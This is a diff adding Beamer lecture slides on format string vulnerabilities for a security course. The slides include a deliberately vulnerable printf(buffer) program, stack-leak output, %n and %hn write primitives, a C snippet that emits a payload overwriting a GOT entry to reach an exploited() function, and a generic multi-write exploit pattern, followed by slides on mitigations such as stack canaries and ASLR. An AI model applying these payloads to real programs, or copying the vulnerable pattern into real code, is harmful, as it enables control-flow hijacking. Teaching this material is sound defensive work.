+    style=smaller,
+    moredelim={**[is][\color{blue!70!black}]{~in~}{~end~}},
+    moredelim={**[is][\btHL<2|handout:0>]{~2~}{~end~}},
+    moredelim={**[is][\btHL<3|handout:0>]{~3~}{~end~}},
+    moredelim={**[is][\btHL<4|handout:0>]{~4~}{~end~}},
+    moredelim={**[is][\btHL<5|handout:0>]{~5~}{~end~}},
+}
+\vspace{-.25cm}
+\begin{lstlisting}
+$ ~in~cat test-format.c~end~
+#include <stdio.h>
+
+int main(void) {
+    char buffer[100];
+    while(fgets(buffer, sizeof buffer, stdin)) {
+        printf(buffer);
+    }
+}
+$ ~in~./test-format.exe~end~
+~in~%016lx %016lx %016lx %016lx %016lx %016lx %016lx %016lx~end~
+~3~00007fb54d0c6790~end~ ~4~786c363130252078~end~ ~4~0000000000ac6048~end~ ~4~3631302520786c36~end~
+~4~3631302500000000~end~ ~5~6c3631302520786c~end~ 786c363130252078 ~2~20786c36313025~end~20
+\end{lstlisting}
+\begin{tikzpicture}[overlay,remember picture]
+    \tikzset{every node/.style={draw,thick,fill=white}}
+    \begin{visibleenv}<2>
+        \node at (current page.center) {
+            {\tt 25 30 31 36 6c 78 20} is ASCII for {\tt \%016lx\textvisiblespace}
+        };
+    \end{visibleenv}
+    \begin{visibleenv}<3>
+        \node at (current page.center) {
+            second argument to {\tt printf}: \%rsi
+        };
+    \end{visibleenv}
+    \begin{visibleenv}<4>
+        \node at (current page.center) {
+            third through fifth argument to {\tt printf}: \%rdx, \%rcx, \%r8, \%r9
+        };
+    \end{visibleenv}
+    \begin{visibleenv}<4>
+        \node at (current page.center) {
+            third through fifth argument to {\tt printf}: \%rdx, \%rcx, \%r8, \%r9
+        };
+    \end{visibleenv}
+    \begin{visibleenv}<5>
+        \node at (current page.center) {
+            16 bytes of stack after return address
+        };
+    \end{visibleenv}
+\end{tikzpicture}
+\end{frame}
+
+\begin{frame}{viewing the stack --- not so bad, right?}
+    \begin{itemize}
+    \item can read stack canaries!
+    \item but actually \textbf{much} worse
+    \item can write values!
+    \end{itemize}
+\end{frame}
+
+\begin{frame}{printf manpage}
+    \begin{itemize}
+        \item For {\tt \%n}:
+        \begin{itemize}
+            \item The  number  of  characters  written so far is \myemph{stored into the integer pointed to by the
+                corresponding argument}.  That argument shall be an {\tt int *}, or variant whose size  matches
+              the  (optionally)  supplied  integer  length  modifier. 
+        \end{itemize}
+    \item<2> {\tt \%hn} --- expect {\tt short \*} instead of {\tt int *}
+    \end{itemize}
+\end{frame}
+
+\begin{frame}[fragile,label=formatSetup]{format string exploit: setup}
+\lstset{
+    language=C,
+    style=small,
+}
+\begin{lstlisting}
+#include <stdlib.h>
+#include <stdio.h>
+
+int exploited() {
+    printf("Got here!\n");
+    exit(0);
+}
+
+int main(void) {
+    char buffer[100];
+    while (fgets(buffer, sizeof buffer, stdin)) {
+        printf(buffer);
+    }
+}
+\end{lstlisting}
+\end{frame}
+
+\begin{frame}[fragile,label=formatGOT]{format string overwrite: GOT}
+\lstset{
+    language={},
+    style=smaller
+}
+\begin{lstlisting}
+0000000000400580 <fgets@plt>:
+  400580:       ff 25 9a 0a 20 00       jmpq   *0x200a9a(%rip)
+        # 601038 <_GLOBAL_OFFSET_TABLE_+0x30>
+`\textit{\ldots}`
+
+0000000000400706 <exploited>:
+...
+\end{lstlisting}
+    \begin{itemize}
+        \item goal: replace \texttt{0x601030} (pointer to \texttt{fgets}) \\
+              with \texttt{0x400726} (pointer to \texttt{exploited})
+    \end{itemize}
+\end{frame}
+
+\begin{frame}[fragile,label=formatExample]{format string overwrite: setup}
+\lstset{
+    language=C,
+    style=smaller,
+}
+\begin{lstlisting}
+    /* advance through 5 registers, then
+     * 5 * 8 = 40 bytes down stack, outputting
+     * 4916157 + 9 characters before using 
+     * %ln to store a long.
+     */
+    fputs("%c%c%c%c%c%c%c%c%c%.4196157u%ln", stdout);
+    /* include 5 bytes of padding to make current location
+     * in buffer match where on the stack printf will be reading.
+     */
+    fputs("?????", stdout);
+    void *ptr = (void*) 0x601038;
+    /* write pointer value, which will include \0s */
+    fwrite(&ptr, 1, sizeof(ptr), stdout);
+    fputs("\n", stdout);
+\end{lstlisting}
+\end{frame}
+
+\begin{frame}{demo}
+\end{frame}
+
+\begin{frame}{demo}
+    \begin{itemize}
+        \item but millions of characters of junk output?
+        \item can do better --- write value in multiple pieces
+            \begin{itemize}
+            \item use multiple \%n
+            \end{itemize}
+    \end{itemize}
+\end{frame}
+    
+\tikzset{
+    mylabel/.style={draw,red,ultra thick,inner sep=0.5mm,label={[red!70!black,fill=white]#1}}
+}
+
+\begin{frame}[fragile,label=exploitPattern]{format string exploit pattern (x86-64)}
+    \begin{itemize}
+        \item write {\tt 1000} (short) to address {\tt 0x1234567890ABCDEF}
+        \item write {\tt 2000} (short) to address {\tt 0x1234567890ABCDF1}
+        \item buffer starts 16 bytes above printf return address
+    \end{itemize}
+\begin{tikzpicture}
+    \begin{scope}
+    \tikzset{every node/.style={font=\tt\small,inner sep=0.1mm}}
+    \node (skipRegs) {\%c\%c\%c\%c\%c};
+    \node[right=0cm of skipRegs](skipStack) {\%c\%c\%c\%c};
+    \node[right=0cm of skipStack] (chooseNumber) {\%.991u};
+    \node[right=0cm of chooseNumber] (writeValue) {\%hn};
+    \node[right=0cm of writeValue] (chooseNumber2) {\%.1000u};
+    \node[right=0cm of chooseNumber2] (writeValue2) {\%hn};
+    \node[right=0cm of writeValue2] (dots) {\ldots};
+
+    \node[below=1cm of writeValue](pointer) {\verb|\x12\x34\x56\x78\x90\xAB\xCD\xEF|};
+    \node[left=0cm of pointer] (dots2) {\ldots};
+    \node[below=0cm of pointer](pointer2) {\verb|\x12\x34\x56\x78\x90\xAB\xCD\xF1|};
+    \end{scope}
+
+    \begin{visibleenv}<2>
+        \node[fit=(skipRegs),mylabel={skip over registers}] {};
+    \end{visibleenv}
+    \begin{visibleenv}<3>
+        \node[fit=(skipStack) (chooseNumber),mylabel={{skip to format string buffer, past format part}}] {};
+    \end{visibleenv}
+    \begin{visibleenv}<4>
+        \node[fit={(chooseNumber)},mylabel={9 + 991 chars is 1000}] {};
+    \end{visibleenv}
+    \begin{visibleenv}<5>
+        \node[fit={(writeValue)},mylabel={write to first pointer}] {};
+    \end{visibleenv}
+    \begin{visibleenv}<6>
+        \node[fit={(chooseNumber2)},mylabel={1000 + 1000 = 2000}] {};
+    \end{visibleenv}
+    \begin{visibleenv}<7>
+        \node[fit={(writeValue2)},mylabel={write to second pointer}] {};
+    \end{visibleenv}
+    % FIXME: annotate these
+\end{tikzpicture}
+\end{frame}
+
+
+\begin{frame}{format string assignment}
+    \begin{itemize}
+        \item released Friday
+        \item one week
+        \item good global variable to target
+            \begin{itemize}
+                \item to keep it simple/consistently working
+                \item more realistic: target GOT entry and use return oriented programming (later)
+            \end{itemize}
+    \end{itemize}
+\end{frame}
+
+
+
+% FIXME: integer overflow with array indices
+
+% FIXME: integer overflow and undefined behavior
+
+% FIXME: Integer overflow
+
+% FIXME: making things reliable
+    % information disclosure from use-after-free, etc.
+    % ...
+
+% FIXME: heap spraying
+
+% FIXME: format string exploits
+
+\begin{frame}{control hijacking generally}
+    \begin{itemize}
+    \item usually: need to know/guess program addresses
+    \item usually: need to insert executable code
+    \item usually: need to overwrite code addresses
+    \vspace{.5cm}
+    \item next topic: countermeasures against these
+    \item later topic: defeating those
+    \item later later topic: secure programming languages
+    \end{itemize}
+\end{frame}
+
+\begin{frame}{control hijacking flexibility}
+    \begin{itemize}
+        \item lots of \myemph{generic} pointers \myemph{to code}
+        \begin{itemize}
+            \item vtables, GOT entries, function pointers, return addresses
+            \item pretty much any large program
+        \end{itemize}
+    \item \myemph{data pointer overwrites} become code pointer overwrites
+        \begin{itemize}
+            \item overwrite data pointer to point to code pointer
+            \item data pointers are everywhere!
+        \end{itemize}
+    \item type confusion from use-after-free is pointer overwrite
+        \begin{itemize}
+            \item bounds-checking won't solve all problems
+        \end{itemize}
+    \end{itemize}
+\end{frame}
+
+% FIXME: split slides around here?
+
+\begin{frame}{first mitigation: stack canaries}
+    \begin{itemize}
+    \item saw: stack canaries
+    \item tries to stop:
+        \begin{itemize}
+        \item \myemph{overwriting code addresses} \\
+             (as long it's return addresses)
+        \end{itemize}
+    \item by assuming:
+        \begin{itemize}
+        \item compile-in protection
+        \item attacker can't read off the stack
+        \item attacker can't ``skip'' parts of the stack
+        \end{itemize}
+    \end{itemize}
+\end{frame}
+
+\begin{frame}{second mitigation: address space randomization}
+    \begin{itemize}
+    \item problem for the stack smashing assignment
+    \item tries to stop:
+        \begin{itemize}
+        \item \myemph{know/guess programming addresses} \\
+        \end{itemize}
+    \item by assuming:
+        \begin{itemize}
+        \item program doesn't ``leak'' addresses
+        \item relevant addresses can be changed (not hard-coded in program)
+        \end{itemize}
+    \end{itemize}
+\end{frame}
+
+\begin{frame}{thinking about the threat}
+    \begin{itemize}
+        \item contiguous versus arbitrary writes?
+            \begin{itemize}
+            \item just protect next to target?
+            \item just protect next to buffer?
+            \end{itemize}
+        \item information disclosure or not?
+    \end{itemize}
+\end{frame}
+
+\begin{frame}{convincing developers}
+    \begin{itemize}
+        \item legacy code?
+        \item manual effort?
+        \item performance overhead?
+        \item memory overhead?
+    \end{itemize}
+\end{frame}
+
+\begin{frame}{ideas for mitigations}
+\end{frame}
+
+\begin{frame}{next time}
+    \begin{itemize}
+    \item comparing mitigations
+        \begin{itemize}
+        \item what do they assume the attacker can do?
+        \item effect on performance?
+        \item recompilation? rewriting code?
+        \end{itemize}
+    \end{itemize}
+\end{frame}
